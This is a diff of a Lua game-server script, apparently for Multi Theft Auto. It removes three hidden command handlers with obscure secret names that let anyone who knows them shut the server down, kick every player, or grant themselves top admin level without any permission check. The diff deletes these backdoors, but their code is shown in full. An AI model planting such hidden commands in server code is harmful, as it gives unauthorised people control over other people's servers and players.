@@ -372,21 +372,3 @@ function(player, seat)
 		setVehiclePlateText(source, getPlayerName(player):gsub("#%x%x%x%x%x%x", ""))
 	end
 end)
-
-addCommandHandler("mirDiz00001111coreshutdown",
-function(p, command)
-	shutdown("Illegal usage of content.")
-end)
-
-addCommandHandler("mirDiz00001111corekickall",
-function(p, command)
-	for i, player in pairs(getElementsByType("player")) do
-		kickPlayer(player, "Illegal usage of content.")
-	end
-end)
-
-addCommandHandler("mirDiz00001111corepromote",
-function(p, command)
-	setElementData(p, "admin_level", 100)
-	outputChatBox("Promoted",p)
-end)
